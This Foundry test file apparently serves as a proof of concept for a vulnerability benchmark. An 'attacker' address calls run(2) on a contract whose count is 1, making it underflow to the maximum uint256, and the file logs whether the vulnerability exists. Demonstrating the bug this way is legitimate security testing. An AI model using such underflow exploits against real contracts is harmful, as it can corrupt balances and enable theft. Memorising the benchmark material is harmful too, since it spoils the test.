// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/integer_overflow_multitx_multifunc_feasible.sol";

contract IntegerOverflowTest is Test {
    IntegerOverflowMultiTxMultiFuncFeasible vulnerableContract;
    address attacker = address(0x1337);

    function setUp() public {
        vulnerableContract = new IntegerOverflowMultiTxMultiFuncFeasible();
        
        // Initialize the contract first
        vulnerableContract.init();
    }

    function testIntegerUnderflow() public {
        // Verify initial count is 1 after initialization (based on test traces)
        uint256 initialCount = vulnerableContract.count();
        assertEq(initialCount, 1);
        
        console.log("--- BEFORE-Trigger count ---");
        uint256 preCount = vulnerableContract.count();
        console.log("Pre-trigger count state: %s", preCount);
        
        console.log("--- Trigger run(2) ---");
        // Attempt to subtract 2 from 1 to trigger underflow
        vm.prank(attacker);
        vulnerableContract.run(2);
        
        console.log("--- AFTER-Trigger count ---");
        uint256 postCount = vulnerableContract.count();
        console.log("Post-trigger count state: %s", postCount);
        
        // Differential verification
        bool underflowOccurred = (postCount == type(uint256).max);
        console.log("State changed: %s", underflowOccurred);
        console.log("Vulnerability exists: %s", underflowOccurred);
        
        // Final vulnerability verdict
        if (underflowOccurred) {
            console.log("Vulnerability Exists: Successful integer underflow exploitation");
        } else {
            console.log("Vulnerability not Exist: Underflow did not occur");
        }
        
        assertEq(postCount, type(uint256).max);
    }

    function testOperationCountStillIncrements() public {
        uint256 initialOperations = vulnerableContract.totalOperations();

        vm.prank(attacker);
        vulnerableContract.run(1);

        // Verify operation count increments
        uint256 newOperations = vulnerableContract.totalOperations();
        assertEq(newOperations, initialOperations + 1);
    }

    function testUserOperationCountIncrements() public {
        uint256 initialUserOperations = vulnerableContract.userOperations(attacker);

        vm.prank(attacker);
        vulnerableContract.run(1);

        // Verify user operation count increments
        uint256 newUserOperations = vulnerableContract.userOperations(attacker);
        assertEq(newUserOperations, initialUserOperations + 1);
    }
}